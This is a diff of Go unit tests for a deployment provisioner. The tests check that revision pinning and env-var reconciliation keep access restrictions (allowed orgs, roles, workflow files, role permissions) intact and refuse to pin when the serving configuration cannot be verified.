+	// (merged into the template's ROLE_APP_IDS by the needsCodeDeploy branch
+	// in Provision), but the traffic-serving revision predates that deploy
+	// and only has "coder". Reconciliation must not treat traffic's
+	// ROLE_APP_IDS as the sole source of truth here -- copying it verbatim
+	// would drop "reviewer" even though this same deploy just configured it,
+	// unlike TestEnsureTrafficOnLatestRevision_RevokedRoleDoesNotSurvivePin
+	// where the extra template role is genuinely stale/revoked. Because the
+	// template (the latest-ready revision already built by UpdateFunction)
+	// already carries the reconciled value (traffic's roles plus this run's
+	// AgentAppIDs), no extra reconciliation revision is needed -- the pin
+	// goes straight to that target and "reviewer" survives.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111"}`,
+			"ALLOWED_ROLES": "coder",
+		},
+		TemplateEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111","reviewer":"222"}`,
+			"ALLOWED_ROLES": "coder,reviewer",
+		},
+	}
+	p := newTestProvisioner(Config{
+		ProjectID:   "my-project",
+		Region:      "us-central1",
+		AgentAppIDs: map[string]string{"reviewer": "222"},
+	}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "UpdateServiceEnvVars")
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_NewlyConfiguredRoleReconciledWhenTemplateLacksIt(t *testing.T) {
+	// Same scenario as TestEnsureTrafficOnLatestRevision_NewlyConfiguredRoleSurvivesPin
+	// except the template hasn't picked up "reviewer" yet either (e.g. a
+	// hash-skip re-pin, where no code deploy ran to merge p.cfg.AgentAppIDs
+	// into the template). Reconciliation must still add "reviewer" -- sourced
+	// from this run's config, not from traffic -- before pinning.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111"}`,
+			"ALLOWED_ROLES": "coder",
+		},
+		TemplateEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111"}`,
+			"ALLOWED_ROLES": "coder",
+		},
+	}
+	p := newTestProvisioner(Config{
+		ProjectID:   "my-project",
+		Region:      "us-central1",
+		AgentAppIDs: map[string]string{"reviewer": "222"},
+	}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	var gotIDs map[string]string
+	require.NoError(t, json.Unmarshal([]byte(fake.lastUpdateServiceEnvVars["ROLE_APP_IDS"]), &gotIDs))
+	assert.Equal(t, map[string]string{"coder": "111", "reviewer": "222"}, gotIDs)
+	assert.Equal(t, "coder,reviewer", fake.lastUpdateServiceEnvVars["ALLOWED_ROLES"])
+}
+
+func TestEnsureTrafficOnLatestRevision_ReconcilesWorkflowHostRepos(t *testing.T) {
+	// WORKFLOW_HOST_REPOS is patched directly onto the traffic-serving
+	// revision by AddWorkflowHostRepo/RemoveWorkflowHostRepo and never
+	// written back to the Cloud Functions template, the same way
+	// ALLOWED_ORGS and PER_REPO_WIF_REPOS are. It must be reconciled too.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"WORKFLOW_HOST_REPOS": "acme/workflows",
+		},
+		TemplateEnvVars: map[string]string{},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	assert.Equal(t, "acme/workflows", fake.lastUpdateServiceEnvVars["WORKFLOW_HOST_REPOS"])
+}
+
+func TestEnsureTrafficOnLatestRevision_RefusesPinWhenTrafficEnvUnreliable(t *testing.T) {
+	// When GetServiceRevisionInfo could not read the traffic-serving
+	// revision's own env vars, it falls back to the template and reports
+	// TrafficEnvVarsUnreliable. Comparing that fallback against the
+	// template it was copied from would always look reconciled, silently
+	// re-enabling the exact registration drop reconciliation exists to
+	// prevent. The pin must be refused instead.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+		TrafficEnvVarsUnreliable: true,
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "could not be read reliably")
+	// The refusal must not hand the operator the exact gcloud command it just
+	// declined to run: following it would perform the unverified pin this
+	// function exists to refuse.
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.Contains(t, err.Error(), "re-run mint deploy")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	assert.NotContains(t, fake.calls, "UpdateServiceEnvVars")
+}
+
+func TestEnsureTrafficOnLatestRevision_ReconcileErrorOnInvalidRoleAppIDsJSON(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ROLE_APP_IDS": "not-json",
+		},
+		TemplateEnvVars: map[string]string{
+			"ROLE_APP_IDS": "{}",
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "reconciling registration data")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	assert.NotContains(t, fake.calls, "UpdateServiceEnvVars")
+}
+
+func TestProvisioner_Provision_CodeChanged_PinsTrafficWhenDiverged(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.functionInfo = &FunctionInfo{
+		Name:  "projects/my-project/locations/us-central1/functions/fullsend-mint",
+		State: "ACTIVE",
+		URI:   "https://fullsend-mint-abc123.run.app",
+		EnvVars: map[string]string{
+			"GCP_PROJECT_NUMBER":     "123456789",
+			"WIF_POOL_NAME":          "fullsend-pool",
+			"WIF_PROVIDER_NAME":      "github-oidc",
+			"ALLOWED_ORGS":           "test-org",
+			"ALLOWED_ROLES":          "coder",
+			"ROLE_APP_IDS":           `{"coder":"12345"}`,
+			"FULLSEND_SOURCE_HASH":   "old-hash-that-wont-match",
+			"ALLOWED_WORKFLOW_FILES": "*",
+		},
+	}
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		// ROLE_APP_IDS matches p.cfg.AgentAppIDs (singleRoleAppIDs()) on both
+		// sides so reconciliation finds nothing to change and this test can
+		// isolate the direct-pin behavior it's named for.
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org", "ROLE_APP_IDS": `{"coder":"12345"}`},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org", "ROLE_APP_IDS": `{"coder":"12345"}`},
+	}
+
+	p := newTestProvisioner(Config{
+		ProjectID:         "my-project",
+		GitHubOrgs:        []string{"test-org"},
+		AgentPEMs:         singleRolePEMs(),
+		AgentAppIDs:       singleRoleAppIDs(),
+		FunctionSourceDir: fakeFunctionSourceDir(t),
+	}, fake)
+
+	vars, err := p.Provision(context.Background())
+	require.NoError(t, err)
+	assert.Equal(t, "https://fullsend-mint-abc123.run.app", vars["FULLSEND_MINT_URL"])
+	assert.Contains(t, fake.calls, "UpdateFunction")
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestProvisioner_Provision_SameHash_PinsTrafficWhenDiverged(t *testing.T) {
+	srcDir := fakeFunctionSourceDir(t)
+	sourceZip, err := bundleFunctionSource(srcDir, "", "", StatusGitHubAuth{})
+	require.NoError(t, err)
+	srcHash := sha256Hex(sourceZip)
+
+	fake := newFakeGCFClient()
+	fake.functionInfo = &FunctionInfo{
+		Name:  "projects/my-project/locations/us-central1/functions/fullsend-mint",
+		State: "ACTIVE",
+		URI:   "https://fullsend-mint-abc123.run.app",
+		EnvVars: map[string]string{
+			"GCP_PROJECT_NUMBER":     "123456789",
+			"WIF_POOL_NAME":          "fullsend-pool",
+			"WIF_PROVIDER_NAME":      "github-oidc",
+			"ALLOWED_ORGS":           "test-org",
+			"ALLOWED_ROLES":          "coder",
+			"ROLE_APP_IDS":           `{"coder":"12345"}`,
+			"FULLSEND_SOURCE_HASH":   srcHash,
+			"ALLOWED_WORKFLOW_FILES": "*",
+		},
+	}
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		// ROLE_APP_IDS matches p.cfg.AgentAppIDs (singleRoleAppIDs()) on both
+		// sides so reconciliation finds nothing to change and this test can
+		// isolate the direct-pin behavior it's named for.
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org", "ROLE_APP_IDS": `{"coder":"12345"}`},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org", "ROLE_APP_IDS": `{"coder":"12345"}`},
+	}
+
+	p := newTestProvisioner(Config{
+		ProjectID:         "my-project",
+		GitHubOrgs:        []string{"test-org"},
+		AgentPEMs:         singleRolePEMs(),
+		AgentAppIDs:       singleRoleAppIDs(),
+		FunctionSourceDir: srcDir,
+	}, fake)
+
+	vars, err := p.Provision(context.Background())
+	require.NoError(t, err)
+	assert.Equal(t, "https://fullsend-mint-abc123.run.app", vars["FULLSEND_MINT_URL"])
+	assert.NotContains(t, fake.calls, "UpdateFunction")
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestProvisioner_Provision_CodeChanged_PreservesOrgOnlyOnTrafficRevision(t *testing.T) {
+	// "legacy-org" was registered on the traffic-serving revision via a
+	// direct Cloud Run patch (e.g. a prior EnsureOrgInMint call) that never
+	// reached the Cloud Functions template. A code deploy seeds its new
+	// revision from that stale template, so the latest-ready revision this
+	// deploy produces is missing "legacy-org" — the pin must not drop it.
+	fake := newFakeGCFClient()
+	fake.functionInfo = &FunctionInfo{
+		Name:  "projects/my-project/locations/us-central1/functions/fullsend-mint",
+		State: "ACTIVE",
+		URI:   "https://fullsend-mint-abc123.run.app",
+		EnvVars: map[string]string{
+			"GCP_PROJECT_NUMBER":     "123456789",
+			"WIF_POOL_NAME":          "fullsend-pool",
+			"WIF_PROVIDER_NAME":      "github-oidc",
+			"ALLOWED_ORGS":           "test-org",
+			"ALLOWED_ROLES":          "coder",
+			"ROLE_APP_IDS":           `{"coder":"12345"}`,
+			"FULLSEND_SOURCE_HASH":   "old-hash-that-wont-match",
+			"ALLOWED_WORKFLOW_FILES": "*",
+		},
+	}
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "legacy-org,test-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+	}
+
+	p := newTestProvisioner(Config{
+		ProjectID:         "my-project",
+		GitHubOrgs:        []string{"test-org"},
+		AgentPEMs:         singleRolePEMs(),
+		AgentAppIDs:       singleRoleAppIDs(),
+		FunctionSourceDir: fakeFunctionSourceDir(t),
+	}, fake)
+
+	vars, err := p.Provision(context.Background())
+	require.NoError(t, err)
+	assert.Equal(t, "https://fullsend-mint-abc123.run.app", vars["FULLSEND_MINT_URL"])
+	assert.Contains(t, fake.calls, "UpdateFunction")
+	// Reconciled through UpdateServiceEnvVars rather than a raw
+	// PinServiceTraffic, since the latest-ready revision was missing
+	// "legacy-org". The only pin is the pre-deploy one on the serving
+	// revision, issued before UpdateFunction.
+	assert.Equal(t, 1, countCalls(fake.calls, "PinServiceTraffic"))
+	assert.Less(t, indexOfCall(fake.calls, "PinServiceTraffic"), indexOfCall(fake.calls, "UpdateFunction"))
+	assert.Equal(t, "fullsend-mint-00114-fm9", fake.lastPinnedRevision)
+	assert.Contains(t, fake.calls, "UpdateServiceEnvVars")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	assert.Equal(t, "legacy-org,test-org", fake.lastUpdateServiceEnvVars["ALLOWED_ORGS"])
+}
+
+func TestProvisioner_Provision_SameHash_PreservesOrgOnlyOnTrafficRevision(t *testing.T) {
+	srcDir := fakeFunctionSourceDir(t)
+	sourceZip, err := bundleFunctionSource(srcDir, "", "", StatusGitHubAuth{})
+	require.NoError(t, err)
+	srcHash := sha256Hex(sourceZip)
+
+	fake := newFakeGCFClient()
+	fake.functionInfo = &FunctionInfo{
+		Name:  "projects/my-project/locations/us-central1/functions/fullsend-mint",
+		State: "ACTIVE",
+		URI:   "https://fullsend-mint-abc123.run.app",
+		EnvVars: map[string]string{
+			"GCP_PROJECT_NUMBER":     "123456789",
+			"WIF_POOL_NAME":          "fullsend-pool",
+			"WIF_PROVIDER_NAME":      "github-oidc",
+			"ALLOWED_ORGS":           "test-org",
+			"ALLOWED_ROLES":          "coder",
+			"ROLE_APP_IDS":           `{"coder":"12345"}`,
+			"FULLSEND_SOURCE_HASH":   srcHash,
+			"ALLOWED_WORKFLOW_FILES": "*",
+		},
+	}
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		// Same divergence as the code-deploy case above, but here the
+		// hash-skip path re-pins without any code deploy in this run at
+		// all — the pin still must not drop "legacy-org".
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "legacy-org,test-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+	}
+
+	p := newTestProvisioner(Config{
+		ProjectID:         "my-project",
+		GitHubOrgs:        []string{"test-org"},
+		AgentPEMs:         singleRolePEMs(),
+		AgentAppIDs:       singleRoleAppIDs(),
+		FunctionSourceDir: srcDir,
+	}, fake)
+
+	vars, err := p.Provision(context.Background())
+	require.NoError(t, err)
+	assert.Equal(t, "https://fullsend-mint-abc123.run.app", vars["FULLSEND_MINT_URL"])
+	assert.NotContains(t, fake.calls, "UpdateFunction")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	assert.Contains(t, fake.calls, "UpdateServiceEnvVars")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	assert.Equal(t, "legacy-org,test-org", fake.lastUpdateServiceEnvVars["ALLOWED_ORGS"])
+}
+
+func TestEffectiveAllowedRoles_DefaultsOnlyForLiterallyEmpty(t *testing.T) {
+	roleOnly := map[string]string{"coder": "111", "reviewer": "222"}
+	assert.Equal(t, map[string]bool{"coder": true, "reviewer": true}, effectiveAllowedRoles("", roleOnly))
+	// Mirrors mintcore.NewHandler: nonempty values that parse into no entries
+	// deny every role and must not be widened to all registered roles.
+	for _, raw := range []string{",", " ", ", ,", "  ,  "} {
+		assert.Empty(t, effectiveAllowedRoles(raw, roleOnly), "raw %q", raw)
+	}
+	assert.Equal(t, map[string]bool{"coder": true}, effectiveAllowedRoles(" coder ,", roleOnly))
+}
+
+func TestReconcileTargetEnvVars_DenyAllServingAllowedRolesNeverBecomesAllRoles(t *testing.T) {
+	roleIDs := `{"coder":"111","reviewer":"222"}`
+	for _, raw := range []string{",", " ", ", ,"} {
+		// A broader target template must not receive traffic, and the
+		// reconciliation must not write an empty (allow-all) value.
+		merged, err := reconcileTargetEnvVars(
+			map[string]string{"ROLE_APP_IDS": roleIDs, "ALLOWED_ROLES": raw},
+			map[string]string{"ROLE_APP_IDS": roleIDs, "ALLOWED_ROLES": "coder,reviewer"},
+			false, nil)
+		require.Error(t, err, "raw %q", raw)
+		assert.Nil(t, merged)
+		assert.Contains(t, err.Error(), "no allowed roles")
+
+		// Target that already carries the same deny-all state is a no-op
+		// rather than an all-role grant.
+		merged, err = reconcileTargetEnvVars(
+			map[string]string{"ROLE_APP_IDS": roleIDs, "ALLOWED_ROLES": raw},
+			map[string]string{"ROLE_APP_IDS": roleIDs, "ALLOWED_ROLES": raw},
+			false, nil)
+		require.NoError(t, err, "raw %q", raw)
+		assert.Nil(t, merged, "raw %q", raw)
+	}
+}
+
+func TestEnsureTrafficOnLatestRevision_DenyAllServingAllowedRolesRefusesBroaderTarget(t *testing.T) {
+	roleIDs := `{"coder":"111","reviewer":"222"}`
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars:           map[string]string{"ROLE_APP_IDS": roleIDs, "ALLOWED_ROLES": ","},
+		TemplateEnvVars:          map[string]string{"ROLE_APP_IDS": roleIDs, "ALLOWED_ROLES": "coder,reviewer"},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	assert.NotContains(t, fake.calls, "UpdateServiceEnvVars")
+}
+
+func TestReconcileTargetEnvVars_PreservesServingWorkflowFiles(t *testing.T) {
+	base := func(traffic, target string) (map[string]string, map[string]string) {
+		tr := map[string]string{"ALLOWED_ORGS": "test-org"}
+		ta := map[string]string{"ALLOWED_ORGS": "test-org"}
+		if traffic != "" {
+			tr["ALLOWED_WORKFLOW_FILES"] = traffic
+		}
+		if target != "" {
+			ta["ALLOWED_WORKFLOW_FILES"] = target
+		}
+		return tr, ta
+	}
+
+	// Stale wildcard on the target must not replace a serving restriction.
+	tr, ta := base("ci.yml,release.yml", "*")
+	merged, err := reconcileTargetEnvVars(tr, ta, false, nil)
+	require.NoError(t, err)
+	require.NotNil(t, merged)
+	assert.Equal(t, "ci.yml,release.yml", merged["ALLOWED_WORKFLOW_FILES"])
+
+	// Same set in a different order/format is not a change.
+	tr, ta = base("ci.yml,release.yml", " release.yml , ci.yml")
+	merged, err = reconcileTargetEnvVars(tr, ta, false, nil)
+	require.NoError(t, err)
+	assert.Nil(t, merged)
+
+	// A key absent from serving stays absent rather than inheriting the
+	// target's wildcard.
+	tr, ta = base("", "*")
+	merged, err = reconcileTargetEnvVars(tr, ta, false, nil)
+	require.NoError(t, err)
+	require.NotNil(t, merged)
+	_, present := merged["ALLOWED_WORKFLOW_FILES"]
+	assert.False(t, present)
+}
+
+func TestReconcileTargetEnvVars_PreservesServingCustomRolePermissions(t *testing.T) {
+	reduced := `{"bot":{"contents":"read"}}`
+	stale := `{"bot":{"contents":"write"}}`
+
+	// Reduced serving permissions must not regain a stale write grant.
+	merged, err := reconcileTargetEnvVars(
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": reduced},
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": stale},
+		false, nil)
+	require.NoError(t, err)
+	require.NotNil(t, merged)
+	assert.Equal(t, reduced, merged["CUSTOM_ROLE_PERMISSIONS"])
+
+	// Serving has none: the target's stale grants are dropped.
+	merged, err = reconcileTargetEnvVars(
+		map[string]string{"ALLOWED_ORGS": "o"},
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": stale},
+		false, nil)
+	require.NoError(t, err)
+	require.NotNil(t, merged)
+	_, present := merged["CUSTOM_ROLE_PERMISSIONS"]
+	assert.False(t, present)
+
+	// Structurally equal values (key order and flat vs multi-level spelling)
+	// are not a change, so no needless revision is created.
+	flat := `{"a":{"contents":"read"},"b":{"issues":"write"}}`
+	multi := `{"b":{"levels":{"read":{"issues":"write"},"write":{"issues":"write"}}},"a":{"levels":{"write":{"contents":"read"},"read":{"contents":"read"}}}}`
+	merged, err = reconcileTargetEnvVars(
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": flat},
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": multi},
+		false, nil)
+	require.NoError(t, err)
+	assert.Nil(t, merged)
+
+	// Unparsable serving value cannot be verified: refuse.
+	_, err = reconcileTargetEnvVars(
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": "{not json"},
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": stale},
+		false, nil)
+	require.Error(t, err)
+
+	// Unparsable target value is replaced by the serving value.
+	merged, err = reconcileTargetEnvVars(
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": reduced},
+		map[string]string{"ALLOWED_ORGS": "o", "CUSTOM_ROLE_PERMISSIONS": "{not json"},
+		false, nil)
+	require.NoError(t, err)
+	require.NotNil(t, merged)
+	assert.Equal(t, reduced, merged["CUSTOM_ROLE_PERMISSIONS"])
+}
+
+func TestEnsureTrafficOnLatestRevision_StaleWildcardWorkflowFilesAndWritePermsDoNotSurvive(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS":            "test-org",
+			"ALLOWED_WORKFLOW_FILES":  "ci.yml",
+			"CUSTOM_ROLE_PERMISSIONS": `{"bot":{"contents":"read"}}`,
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS":            "test-org",
+			"ALLOWED_WORKFLOW_FILES":  "*",
+			"CUSTOM_ROLE_PERMISSIONS": `{"bot":{"contents":"write"}}`,
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	require.NoError(t, p.ensureTrafficOnLatestRevision(context.Background(), false))
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	assert.Equal(t, "ci.yml", fake.lastUpdateServiceEnvVars["ALLOWED_WORKFLOW_FILES"])
+	assert.Equal(t, `{"bot":{"contents":"read"}}`, fake.lastUpdateServiceEnvVars["CUSTOM_ROLE_PERMISSIONS"])
 }
